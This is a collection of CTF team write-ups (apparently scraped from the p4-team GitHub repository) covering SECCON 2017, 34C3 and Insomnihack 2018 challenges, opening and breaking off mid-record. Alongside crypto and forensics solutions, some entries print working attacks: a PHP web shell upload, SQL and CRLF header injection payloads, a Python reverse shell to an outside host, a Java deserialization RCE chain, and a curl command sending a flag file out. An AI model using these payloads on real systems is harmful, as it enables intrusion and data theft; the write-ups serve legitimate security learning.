smooth</title></head>\n<body>\n<h1>\nAnswer: One of these primes is very smooth.\n</h1>\n</body>\n</html>\n```\n\nAnd the flag is: `SECCON{One of these primes is very smooth.}`\n", "timestamp": "2025-10-21T13:32:02.138828"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/crypto_vigenere/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/crypto_vigenere/README.md", "content": "# Vigenere 3d (Crypto, 100p)\n\nIn the task we get the code:\n\n```python\nimport sys\ndef _l(idx, s):\n    return s[idx:] + s[:idx]\ndef main(p, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    c = \"\"\n    for a in p:\n        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return c\nprint main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])\n```\n\nAnd a call log:\n\n```\n$ python Vigenere3d.py SECCON{**************************} **************\nPOR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\n```\n\nWe know that the flag has format: `SECCON{**************************}`, key has 14 characters and ciphertext is `POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9`.\n\nFirst thing to prepare is decryption function, to use once we manage to recover the key:\n\n```python\ndef decrypt(ct, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))] for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    decrypted = \"\"\n    for a in ct:\n        for c in s:\n            if t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:\n                decrypted += c\n                break\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return decrypted\n```\n\nThis is a very naive brute-force decryptor, but we don't need anything more fancy.\nNow we need to somehow recover the encryption key.\n\nIt's easy to notice that this enryption can generate identical ciphertexts for many different keys.\nIn fact for any chosen key character at position `x` there is a corresponding character at position `13-x` which will produce the right ciphertext character from the plaintext. \nThis is simply because array `t` contains all possible combinations.\nThis means we actually need to recover only 7 characters of the key, because they will automatically fix the other 7 characters.\n\nWe can run:\n```python\ndef recover_key(known_prefix, ciphertex):\n    final_key = ['*'] * 14\n    for pos in range(7):\n        for c in s:\n            partial_candidate_key = ['*'] * 14\n            partial_candidate_key[pos] = c\n            partial_candidate_key[13 - pos] = c\n            key = \"\".join(partial_candidate_key)\n            res = encrypt(known_prefix, key, key[::-1])\n            if res[pos] == ciphertex[pos]:\n                final_key[pos] = c\n                final_key[13 - pos] = c\n                print \"\".join(final_key)\n    return \"\".join(final_key)\n```\n\nTo generate a key which will be a palindrome.\nWe could just as well always set `partial_candidate_key[13 - pos] = 'A'` or any other fixed character.\n\nOnce we run this, we recover the key and can decrypt the flag: `SECCON{Welc0me_to_SECCON_CTF_2017}`\n\nFull solver [here](vigenere.py)\n", "timestamp": "2025-10-21T13:32:02.365485"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/misc_jpeg/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/misc_jpeg/README.md", "content": "# JPEG File (Misc, 100p)\n\n```\nIt will be fixed if you change somewhere by 1 bit.\n```\n\nIn the task we get a [jpeg file](tktk.jpg) and the description is quite clear - we need a single bitflip to uncover the flag.\nWe simply generated images with bitflips and the scrolled through thumbnails.\nWe thought about using tesseract but it would take much time.\n\nBitflips were generated via:\n\n```python\nimport codecs\n\n\ndef main():\n    start_byte = 0\n    stop_byte = 700\n    with codecs.open(\"tktk.jpg\", \"rb\") as input_file:\n        data = input_file.read()\n    for byte in range(start_byte, stop_byte):\n        for bit in range(8):\n            modified = chr(ord(data[byte]) ^ (1 << bit))\n            output_data = data[:byte] + modified + data[byte + 1:]\n            with codecs.open(\"res/\" + str(byte) + \"_\" + str(bit) + \".jpg\", \"wb\") as output_file:\n                output_file.write(output_data)\nmain()\n```\n\nAnd once we flipped bits in byte 623 we got the flag:\n\n![](623_1.jpg)\n\nThe flag was `SECCON{jp3g_study}`\n", "timestamp": "2025-10-21T13:32:02.623421"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/web_automatic/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/web_automatic/README.md", "content": "# Automatic door (Web, 500p)\n\nIn the task we get the source code of a webpage we can access:\n\n```php\n <?php\n$fail = str_repeat('fail', 100);\n$d = 'sandbox/FAIL_' . sha1($_SERVER['REMOTE_ADDR'] . '95aca804b832f4c329d8c0e7c789b02b') . '/';\n@mkdir($d);\n\nfunction read_ok($f)\n{\n    return strstr($f, 'FAIL_') === FALSE &&\n        strstr($f, '/proc/') === FALSE &&\n        strstr($f, '/dev/') === FALSE;\n}\n\nfunction write_ok($f)\n{\n    return strstr($f, '..') === FALSE && read_ok($f);\n}\n\nfunction GetDirectorySize($path)\n{\n    $bytestotal = 0;\n    $path = realpath($path);\n    if ($path !== false && $path != '' && file_exists($path)) {\n        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)) as $object) {\n            $bytestotal += $object->getSize();\n        }\n    }\n    return $bytestotal;\n}\n\nif (isset($_GET['action'])) {\n    if ($_GET['action'] == 'pwd') {\n        echo $d;\n\n        exit;\n    }\n    else if ($_GET['action'] == 'phpinfo') {\n        phpinfo();\n\n        exit;\n    }\n    else if ($_GET['action'] == 'read') {\n        $f = $_GET['filename'];\n        if (read_ok($f))\n            echo file_get_contents($d . $f);\n        else\n            echo $fail;\n\n        exit;\n    } else if ($_GET['action'] == 'write') {\n        $f = $_GET['filename'];\n        if (write_ok($f) && strstr($f, 'ph') === FALSE && $_FILES['file']['size'] < 10000) {\n            print_r($_FILES['file']);\n            print_r(move_uploaded_file($_FILES['file']['tmp_name'], $d . $f));\n        }\n        else\n            echo $fail;\n\n        if (GetDirectorySize($d) > 10000) {\n            rmdir($d);\n        }\n\n        exit;\n    } else if ($_GET['action'] == 'delete') {\n        $f = $_GET['filename'];\n        if (write_ok($f))\n            print_r(unlink($d . $f));\n        else\n            echo $fail;\n\n        exit;\n    }\n}\n\nhighlight_file(__FILE__);\n```\n\nWe can read/write files and we need to get a shell.\nWe can't save files with `ph` in same so no `.php` files for us.\n\nWe've made a small script to upload files:\n\n```python\ndef upload_file(filename):\n    with codecs.open(filename, \"r\") as f:\n        res = requests.post(\n            \"http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/?action=write&filename=\" + filename,\n            files={\"file\": f})\n        print(res.text)\n```\n\nIt seems we can upload a `.htaccess` file with:\n\n```\nAddType application/x-httpd-php .html .htm\n```\n\ninside and the system will execute php also in html files.\nNow we can upload html file with a PHP shell, but according to phpinfo() most of shell-like functions are disabled.\nFortunately not all of them -> http://php.net/manual/en/function.proc-open.php is still available.\n\nWe run `/flag_x` as stated in the task description and we recover the flag `SECCON{f6c085facd0897b47f5f1d7687030ae7}`\n", "timestamp": "2025-10-21T13:32:02.868267"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-09-seccon-quals/web_sqlsrf/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-09-seccon-quals/web_sqlsrf/README.md", "content": "# SqlSRF (Web, 400p)\n\n```\nThe root reply the flag to your mail address if you send a mail that subject is \"give me flag\" to root.\n```\n\nIn the task initially we get access to a login screen and [source code of the index page](index.pl]).\nFirst goal is to somehow login into the system.\n\nIn the sources we can see:\n\n```perl\nif($q->param('login') ne '') {\n  use DBI;\n  my $dbh = DBI->connect('dbi:SQLite:dbname=./.htDB');\n  my $sth = $dbh->prepare(\"SELECT password FROM users WHERE username='\".$q->param('user').\"';\");\n  $errmsg = '<h2 style=\"color:red\">Login Error!</h2>';\n  eval {\n    $sth->execute();\n    if(my @row = $sth->fetchrow_array) {\n      if($row[0] ne '' && $q->param('pass') ne '' && $row[0] eq &encrypt($q->param('pass'))) {\n        $s->param('autheduser', $q->param('user'));\n        print \"<scr\".\"ipt>document.location='./menu.cgi';</script>\";\n        $errmsg = '';\n      }\n    }\n  };\n  if($@) {\n    $errmsg = '<h2 style=\"color:red\">Database Error!</h2>';\n  }\n  $dbh->disconnect();\n```\n\nThere is a clear SQLInjection in the query which is supposed to retrieve the password for given user from the database.\nThe password is then compared with `&encrypt($q->param('pass'))`.\nWe can easily inject any password simply by providing username `whateve' union select 'OUR_PASSWORD` but we need to know the encrypted form of `OUR_PASSWORD` for this to work.\nFortunately we can see in the code also:\n\n```perl\nmy $user = $q->param('user');\n//\n($q->param('save') eq '1' ? $q->cookie(-name=>'remember', -value=>&encrypt($user), -expires=>'+1M') : undef)\n```\n\nIf we put username and select \"remember me\" checkbox, the system will automatically create the cookie with encrypted username.\nWe can then first put `OUR_PASSWORD` as username, select \"remember me\", click login and retrieve the encrypted string from the cookie.\n\nOnce we manage to login into th system it turns out it's no good because as non-admin user we can only use `netstat` command and we can't use `wget`:\n\n![](page.png)\n\nNetstat at least shows that there is SMTP server running there, and the task description says we need to use it to send email to root.\n\nIt seems we actually need to login as admin, because right now the system remembers exactly what username we put, and we're logged in as `whateve' union select ...` and not as `admin`.\nFirst step is to retrieve the admin password from database.\nThis we can do via Blind SQLInjection in the login screen.\nWe can't get any echo from the database but we can either login or not login, and we can use this as boolean oracle.\nSo we can do injection in the form `whatever' union select 'OUR_ENCRYPTED_PASSWORD' where (CONDITION) and '1'='1`.\nThe `CONDITION` here is simply a check on the characters of admin password.\n\nAfter a moment we get back: `d2f37e101c0e76bcc90b5634a5510f64`.\nNow we need to decrypt this password.\nIt turns out there is an interesting code on the page:\n\n```perl\n$user = &decrypt($q->cookie('remember')) if($user eq '' && $q->cookie('remember') ne '');\n//\n$user = $q->escapeHTML($user);\n//\n<tr><td>Username:</td><td><input type=\"text\" name=\"user\" value=\"$user\"></td></tr>\n```\n\nThe page actually takes encrypted string from `remember` cookie, decrypts and puts in the `login` field of the form.\nIt means we can simply place the recovered password in the cookie, and the page will decrypt it for us.\nThis way we learn that admin password is `Yes!Kusomon!!`.\n\nNow we're back in the system, this time as admin, and we can run `wget`.\nSadly we can't really change neither of the commands and no command injection tricks work, we can only use what is provided.\nWe have to use `wget` to send an email!\n\nSMTP and FTP servers are often very permissive when it comes to accepting commands.\nThey simply ignore incorrect commands and execute correct ones.\nWhat `wget` sends to the designated host is:\n\n```\nGET / HTTP/1.1\nUser-Agent: Wget/1.14 (linux-gnu)\nAccept: */*\nHost: 127.0.0.1\nConnection: Keep-Alive\n```\n\nAnd SMTP server will simply claim that those are all incorrect commands.\n\nWe've noticed that `wget` version was outdated, so maybe there is some vulnerability we could use.\nSome googling brought us to https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html and this was exactly what we needed.\nIt turns out we can use newlines and line feeds to modify `Host` header and append additional elements there.\nWe need to add:\n\n```\nHELO 127.0.0.1\nMAIL FROM:<shalom@p4.team>\nRCPT TO:<root@ymzk01.pwn>\nDATA\nFrom: shalom@p4.team\nTo: root@ymzk01.pwn\nSubject: give me flag\n.\nQUIT\n```\n\nSo we prepared the payload (with percent escapes):\n\n```\n127.0.0.1%0d%0aTest%3a %0aHELO 127.0.0.1%0aMAIL FROM%3a%3cshalom%40p4.team%3e%0aRCPT TO%3a%3croot%40ymzk01.pwn%3e%0aDATA%0aFrom%3a shalom%40p4.team%0aTo%3a root%40ymzk01.pwn%0aSubject%3a give me flag%0d%0a.%0d%0a%0aQUIT%0a:25\n```\n\nAnd we got:\n\n![](attack.png)\n\nAnd right after that we've received the flag, encrypted again with the same encryption as passwords.\nSo we used the remember cookie trick again and finally recovered the flag: `SECCON{SSRFisMyFriend!}`\n", "timestamp": "2025-10-21T13:32:03.121045"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-29-34c3/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-29-34c3/README.md", "content": "# 34C3 CTF 2017\n\nTeam: Eternal, rev, msm, nazywam, psrok1, c7f.m0d3, akrasuski1, shalom\n\n### Table of contents\n\n* [Software update (crypto)](crypto_software_update)\n* [lol (crypto)](crypto_lol)\n* [blinkenlights (re)](blinkenlights)\n", "timestamp": "2025-10-21T13:32:03.744757"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-29-34c3/blinkenlights/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-29-34c3/blinkenlights/README.md", "content": "# Blinkenlights (rev, 242p, 15 solves)\n\n> I built something that prints the flag. But I lost the flag :(\n>\n> Difficulty: medium\n\nIn this task we got a binary firmware for ARM architecture, and a 400MB CSV containing oscilloscope traces\nof a channel. Initially I wasted a couple hours trying to reverse engineer the binary, but it turned out that\nI was able to solve the challenge using just the CSV, i.e. in a black box way.\n\nThe CSV had two integer columns: `sample` and `channel 1`, but the second column seemed to alternate between 0 and 1,\nso it did not contain any information for us.\nProbably it's because the oscilloscope was compressing the signal using algorithm similar to run length encoding.\nThis means we are only interested in the first column. I've preprocessed it to calculate the difference between two\nconsecutive times and noticed that the times corresponding to \"1\" state are always quite short compared to\nthe other ones - and the \"0\" times are varying in length. So there's probably some kind of message encoded in \ntime between pulses.\n\nAfter excluding several very long (~100 times longer than average) times - they seem to be some kind of synchronization,\nnot needed for us - I've multiplied every sample by ten and stored as greyscale imaage, hoping to notice some pattern.\nIt turned out that setting width to 6144 (guessed) we can notice some barely readable text - a flag!\n\n![img](L6144.png)\n", "timestamp": "2025-10-21T13:32:03.985110"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-29-34c3/crypto_lol/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-29-34c3/crypto_lol/README.md", "content": "# lol (Crypto, 233p, 16 solved)\n\nIn the task we get [encryption code](encrypt.cpp) and [encrypted flag](flag.txt.enc).\nThis task turned out to be \"broken\" and solvable with an unintended solution, so another version was released at some point with a fix.\n\nThe code here is pretty straighforward.\nCore part is:\n\n```c\n    string input;\n    in >> input;\n    Vector plaintext(input.size());\n    copy(input.begin(), input.end(), begin(plaintext));\n\n    // Generate deterministic helper matrix A\n    Matrix A(key_size, plaintext.size());\n    {\n        RNG rng(0);\n        A.fill(&rng);\n    }\n\n    // Generate random key\n    Vector key(key_size);\n    {\n        RNG rng;\n        for (auto& x : key)\n            x = rng.next_qword_safe();\n    }\n\n    Vector cipher = A * plaintext + key;\n```\n\nThe flag is treated as integer vector and multiplied by a fixed matrix, and the a random key vector is added to the result.\n\n```\nciphertext = M*flag + key\n```\n\nIn order to recover the flag we would have to figure out the random key vector, subtract it from the ciphertext we have and then solve the matrix equation.\n\nThe random number generator is:\n\n```c\nstruct RNG {\n    random_device dev;\n    mt19937_64 rng;\n    RNG() : dev(), rng(dev()) {}\n    RNG(uint64_t seed) : rng(seed) {}\n\n    bool next_bit() { return rng() & 1; }\n\n    // For when we want to hide the RNG state\n    uint64_t next_qword_safe() {\n        uint64_t res = 0;\n        for (int i = 0; i < 64; ++i)\n            res |= next_bit() << i;\n        return res;\n    }\n\n    // For when we don't care about security\n    uint64_t next_qword_fast() {\n        return rng();\n    }\n};\n```\n\nIt might seem pretty strong - the `next_qword_safe` function generates 64 bit uint one bit at a time from `mt19937_64`, so untwisting the generator state is pretty much impossible.\nThere are two strange things to notice here:\n\n- A single bit from the generator is extracted via function `bool next_bit() { return rng() & 1; }`, which means it's treated as `bool`. It's interesting because we later do a bitshift of this value, and boolean is promoted to a `signed int`, which means the bitshift will cause a sign extension, making the high bits not-so-random.\n- Random number generator is seeded with a call to `random_device` and if we check the signature of the `operator()` we will see `result_type operator()();` and we can read that `result_type is a member type, defined as an alias of unsigned int.`\n\nThe second remark is a key to solve this version of the task - the seed is an `unsigned int` so a 32 bit value - we can simply brute-force all possible seeds!\n\nNot the remaining part is to solve the matrix equation for a given `random key` and check if it's the flag, but we need to do this reasonably fast.\nSince the matrix `M` is constant, we can calculate inverse matrix and multiply it by the `ciphertext - random_key` to get the result candidate flag.\nThis is much easier and faster than using some Gauss elimitation to solve the equation.\nEven more if we realise that we need to perform all calculations in a ring modulo 2**64, because in the original code all computations are wrapping around uint_64.\n\nA small difficulty here is that the matrix is not square - random key is 64 bytes long and the flag is only 37 bytes long, therefore the matrix `M` is 37x64 and we can't invert such matrix.\nWe can, however, select a subset of matrix rows and use only those.\nThis is due to the fact that when doing a multiplication `M * flag` each element of the resulting vector is a linear combination of all of the elements of the flag vector.\nSo we really need only as many elements of this vector as the uknown variables.\nWe can't select those rows randomly, because some of the matrix rows might not be independent, and we need 37 independent rows (not `independent` here means that a certain row `M[i]` is equal to `k * M[j]` where `k` is some integer and `M[j]` is another matrix row).\n\nWe used `sage` to check 37-elements combinations of the matrix `M` rows and find a set of independent rows.\nIt turned out that if we take rows `[4:41]` we will be fine.\n\n```python\nR = IntegerModRing(2**64)\ncoefficients = load() # matrix rows generated with the original source code\nM = Matrix(R, coefficients[4:37+4]) \nM.inverse()\n```\n\nOnce we have the inverse matrix, we can do:\n\n```c\nVector load_result(string path){\n    ifstream in(path.c_str(), ios::binary);\n    char buffer[8];\n    in.read(buffer, 8);\n    uint64_t size = *reinterpret_cast<uint64_t*>(buffer);\n    Vector all(64);\n    for(int i=0;i<64;i++){\n        in.read(buffer, 8);\n        uint64_t element = *reinterpret_cast<uint64_t*>(buffer);\n        all[i] = element;\n    }\n    Vector res(size);\n    for(int i=0;i<size;i++){\n        res[i] = all[i+4];\n    }\n    return res;\n}\n\nint main(int argc, const char **argv) {\n    if(argc < 4){\n        cerr<<\"./binary start end encrypted_file\"<<endl;\n        exit(-1);\n    }\n    unsigned int start = atoi(argv[1]);\n    unsigned int end = atoi(argv[2]);\n    Vector result = load_result(string(argv[3]));\n\n    Matrix A_inv(37, 37);\n    uint64_t data[] = {...}; # list of inverse matrix coefficients\n    A_inv.fill(data);\n\n    // Generate random key\n    for(unsigned int i=start;i<end;i++){\n        if((i & 0xFFFFF) == 0){\n            cout<<i<<endl;\n        }\n        Vector key(key_size);\n        {\n            RNG rng(i);\n            for (auto& x : key)\n                x = rng.next_qword_safe();\n        }\n        Vector cut_key(37);\n        for(int j=0;j<37;j++){\n            cut_key[j] = key[j+4];\n        }\n        Vector clean = (result - cut_key);\n        Vector solution = A_inv * clean;\n        if(solution[0] == 51) {\n            cout<<\"match at seed = \"<<i<<endl;\n            for (int k=0;k<37;k++) {\n                cout << solution[k]<<\" \";\n            }\n        }\n    }\n}\n```\n\nAnd with such code we can test all seed ranges from `start` till `end`.\nIt takes a while, but we can run this in paralell on as many cores as we have available and at some point we get a match and the result flag `34C3_l3nstra_w0uld_h4ve_b33n_s0_proud`, which indicates that the author expected this to be solved via `LLL`.\n\nThe complete solver code available [here](brute.cpp)\n", "timestamp": "2025-10-21T13:32:04.260689"}
{"source": "github", "repo": "p4-team/ctf", "file": "2017-12-29-34c3/crypto_software_update/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2017-12-29-34c3/crypto_software_update/README.md", "content": "# Software update (Crypto, 182p, 23 solved)\n\nIn the task we get a package with the server script and example archive with \"software update\".\nThe server script simply reads a base64 encoded zip file from the socket, unpacks it, calculates expected signature of the archive contents and compares it with the attached signature.\n\nIf the signature matches the archive contents the server runs two python scripts inside the archive.\nIf we could add our own code in one of those scripts, we would gain RCE on the server.\n\nSignature verification is:\n\n```python\ndef check_signature(path, public_key):\n    \n    hash_value = compute_hash(path + \"/signed_data\")\n    with open(path + \"/\" + signature_filename, \"rb\") as f:\n        signature = f.read()\n    verifier = PKCS1_PSS.new(public_key)\n    return verifier.verify(Crypto.Hash.SHA256.new(hash_value), signature)\n```\n\nand it's rather solid. \nThe RSA public key is strong and there is no way of forging the signature.\n\nWe have the example [update archive](sw_update.zip) with it's initial, correct signature.\nIt's the only signature we can really use, so the only way to smuggle some of our own code is if the archive contents hash does not change.\n\nThe hash is calculated as:\n\n```python\ndef compute_hash(directory):\n    \"\"\"compute a hash of all files contained in <directory>.\"\"\"\n    \n    files = glob.glob(directory + \"/**\", recursive=True)\n    files.sort()\n    files.remove(directory + \"/\")\n    result = bytearray(hashlib.sha256().digest_size)\n    \n    for filename in files:\n        complete_path = filename\n        relative_path = os.path.relpath(filename, directory)\n        if os.path.isfile(complete_path):\n            with open(complete_path, \"rb\") as f:\n                h = hashlib.sha256(relative_path.encode('ASCII'))\n                h.update(b\"\\0\")\n                h.update(f.read())\n        elif os.path.isdir(complete_path):\n            relative_path += \"/\"\n            h = hashlib.sha256(relative_path.encode('ASCII') + b\"\\0\")\n        else:\n            pass\n        \n        result = xor(result, h.digest())\n    \n    return result\n```\n\nInitially we tried to use the fact that this function does not take into consideration all files, and does not count symlinks.\nFor example if this code: `relative_path += \"/\"` was not there, we could put a directory intead of one of the python files, without changing the archive hash.\nFinally we came into conclusion that this can't be done.\n\nThe interesting thing to notice about this function is `result = xor(result, h.digest())`.\n\nIt contains a bug, most likely unintended - if we include a symlink in the archive, then new value of `h` will not be computed, and thus the xor will be performed again with the previous file hash, nullifying it.\nSadly this was not really exploitable.\n\nThis `xor` here is unusual, and we figured that we need to use it.\nWe can change one of the python scripts, and calculate the new hash.\nThen we can xor this new hash with the old hash, and we will get the `difference hash`.\nIf we could now generate a file which would be hashed to this exact value, we could use it to nullify the changes we made to the script.\nBut this would mean basically breaking sha256, because we would like to get a plaintext for a given hash value...\n\nHowever, we don't need to do this with a single file!\nWe can use as many files as we need.\nThis becomes a problem similar to `Subset Sum` - given a list of random files for which we know sha256 hashes, we would like to know if `xor` of a subset of those hashes gives the `difference hash` we have.\nWe generated a bunch of empty randomly-named files, hashed them the same way as in the server (so with trialing nullbyte), and the run a modified `subset sum` solver on them, with the target value set to the `difference hash`.\n\nThis way we got a list of files, which included in the archive would cause the archive hash to be identical to the initial one.\nOnce we knew the method works we created a reverse shell in on the installer python scripts:\n\n```python\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"tailcall.net\",12345))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\nwe generated a new set of files to include in the archive, zipped it and sent to the server via:\n\n```python\ndef send_payload():\n    with codecs.open(\"new_update/sw_update.zip\", \"rb\") as input_file:\n        payload = base64.b64encode(input_file.read())\n        s = nc(\"35.198.64.68\", 2023)\n        msg = s.recv(9999)\n        challenge = re.findall(b\"Proof of work challenge: (.*)\\s+\", msg)[0]\n        send(s, str(solve_proof_of_work(challenge)))\n        print(s.recv(9999))\n        send(s, payload)\n        print(s.recv(9999))\nsend_payload()\n```\n\nAnd after a moment we got a connection to our reverse shell.\n", "timestamp": "2025-10-21T13:32:04.515445"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-01-20-insomnihack/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-01-20-insomnihack/README.md", "content": "# InsomniHack Teaser CTF 2018\n\nTeam: c7f.m0d3, sasza, nazywam, akrasuski1, ppr, rodbert, hubert, borysp, rev, cr019283, psrok1, shalom\n\n### Table of contents\n\n* [MagicHat (pwn)](pwn_magic_hat)\n* [Cool Storage Service (web)](web_css)\n", "timestamp": "2025-10-21T13:32:05.047504"}
{"source": "github", "repo": "p4-team/ctf", "file": "2018-01-20-insomnihack/pwn_magic_hat/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2018-01-20-insomnihack/pwn_magic_hat/README.md", "content": "# MagicHat (Pwn, 321p, 9 solved)\n\n[PL](#pl-version)\n\nIn the task we get a [client](magic_hat_client.jar) for Java RMI application.\nWe can add this jar as a library in IntelliJ IDEA project, and it will decompile the code for us.\n\nThe code is rather simple, we establish a connection via RMI with the server and then we can place some objects inside Hat object, and send it to the server.\nServer takes those objects and does some operations on them.\n\n```java\nProperties props = System.getProperties();\nprops.setProperty(\"javax.net.ssl.trustStore\", \"magic_hat_truststore\");\nprops.setProperty(\"javax.net.ssl.trustStorePassword\", \"magic_hat\");\nRegistry registry = LocateRegistry.getRegistry(InetAddress.getByName(\"magichat.teaser.insomnihack.ch\").getHostName(), 51966, new SslRMIClientSocketFactory());\nWizardAPI wizardAPI = (WizardAPI)registry.lookup(\"Wizard\");\n//\nHat magicHat = wizardAPI.getMagicHat();\n//\nmagicHat.add(new Wand());\n//\nPair<String, Hat> answer = wizardAPI.castASpell(magicHat);\nmagicHat = (Hat)answer.getRight();\nSystem.out.println((String)answer.getLeft());\n```\n\nRMI has 2 types of objects which can be passed between remote endpoints - Remote objects (passed as proxies), and Serializable objects, passed in serialized form.\nIn our case every artifact we can place in the Hat is Serializable.\nThe Hat itself is simply:\n\n```java\npublic class Hat extends Artifact {\n    private Bag content = new HashBag();\n\n    public void add(Artifact a) {\n        this.content.add(a);\n    }\n\n    public String toString() {\n        String str = super.toString();\n        if (!this.content.isEmpty()) {\n            str = str + \" that contains: \\n\" + this.content.toString().replace(\":\", \"x \").replace(',', '\\n');\n        }\n        return str;\n    }\n}\n```\n\nThe vulnerability here is that server endpoint deserializes objects we send. \nIt might later crash with `ClassCastException` if the objects were not of the expected type, but they will be deserialized before that happens.\nIt's also worth understanding that Java doesn't have notion of generic types at runtime.\nPretty much any collection type can store any objects, also of totally unrelated types.\nIt means we can store anything in the `HashBag` in `Hat` class.\n\nWe used slightly modified payload from [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java).\nWe use the same approach, but instead of `HashSet` we create `HashBag`, we also used `Whitebox` to skip all the reflection madness:\n\n```java\nprivate static Hat preparePayload(String command) {\n\t// like in CommonsCollections6\n\tString[] execArgs = new String[]{command};\n\tTransformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};\n\tTransformer transformerChain = new ChainedTransformer(transformers);\n\tMap innerMap = new HashMap();\n\tMap lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\tTiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");\n\tHashBag bagWithExploit = new HashBag();\n\tbagWithExploit.add(new Object());\n\n\tMap internalMap = Whitebox.getInternalState(bagWithExploit, \"map\");\n\tObject[] nodesArray = Whitebox.getInternalState(internalMap, \"table\");\n\tObject node = Arrays.stream(nodesArray)\n\t\t\t.filter(Objects::nonNull)\n\t\t\t.findFirst()\n\t\t\t.orElseThrow(() -> new RuntimeException(\"this can't happen\"));\n\tWhitebox.setInternalState(node, \"key\", entry);\n\n\tHat hat = new Hat();\n\tWhitebox.setInternalState(hat, \"content\", bagWithExploit);\n\treturn hat;\n}\n```\n\nNow we can simply send this `hat` to the server to invoke `command`.\nWe run the exploit with:\n\n```java\n    public static void main(final String[] args) throws Exception {\n        Properties props = System.getProperties();\n        props.setProperty(\"javax.net.ssl.trustStore\", \"magic_hat_truststore\");\n        props.setProperty(\"javax.net.ssl.trustStorePassword\", \"magic_hat\");\n        Registry registry = LocateRegistry.getRegistry(InetAddress.getByName(\"magichat.teaser.insomnihack.ch\").getHostName(), 51966, new SslRMIClientSocketFactory());\n        WizardAPI wizard = (WizardAPI) registry.lookup(\"Wizard\");\n        Scanner sc = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"> \");\n            execCommand(wizard, sc.nextLine());\n        }\n    }\n\n    private static void execCommand(WizardAPI wizard, String command) {\n        try {\n            wizard.castASpell(preparePayload(command));\n        } catch (Exception e) {\n        }\n    }\n```\n\nAnd we basically have RCE on the server, although without immediate echo, but we can always drop a reverse-shell.\nAfter some poking around we find the `flag.txt` file in `/home/magic-hat` so we can grab it with:\n\n`curl -d @/home/magic-hat/flag.txt -X POST https://requestb.in/blablabla`\n\nAnd we get: `INS{lol_ur_a_lizard_Gary!}`\n\n### PL version\n\nW zadaniu dostajemy [klienta](magic_hat_client.jar) dla aplikacji Java RMI.\nMożemy dodać ten jar jako bibliotekę w IntelliJ IDEA żeby automatycznie zobaczyć zdekompilowany kod.\n\nKod jest dość prosty, łączymy się z serwerem za pomocą RMI, następnie możemy dodać pewne obiekty do obiektu Hat a potem wysłać je do serwera.\nSerwer bierze te obiekty i wykonuje na nich pewne operacje.\n\n```java\nProperties props = System.getProperties();\nprops.setProperty(\"javax.net.ssl.trustStore\", \"magic_hat_truststore\");\nprops.setProperty(\"javax.net.ssl.trustStorePassword\", \"magic_hat\");\nRegistry registry = LocateRegistry.getRegistry(InetAddress.getByName(\"magichat.teaser.insomnihack.ch\").getHostName(), 51966, new SslRMIClientSocketFactory());\nWizardAPI wizardAPI = (WizardAPI)registry.lookup(\"Wizard\");\n//\nHat magicHat = wizardAPI.getMagicHat();\n//\nmagicHat.add(new Wand());\n//\nPair<String, Hat> answer = wizardAPI.castASpell(magicHat);\nmagicHat = (Hat)answer.getRight();\nSystem.out.println((String)answer.getLeft());\n```\n\nRMI pozwala na przekazywanie pomiędzy zdalnymi klientami 2 typów obiektów - obiekty Remote (przesyłane jako proxy) oraz obiekty Serializable, w formie zserializowanej.\nW naszym przypadku wszystkie artefakty które możemy umieścić w Hat są Serializable.\nKlasa Hat to po prostu:\n\n```java\npublic class Hat extends Artifact {\n    private Bag content = new HashBag();\n\n    public void add(Artifact a) {\n        this.content.add(a);\n    }\n\n  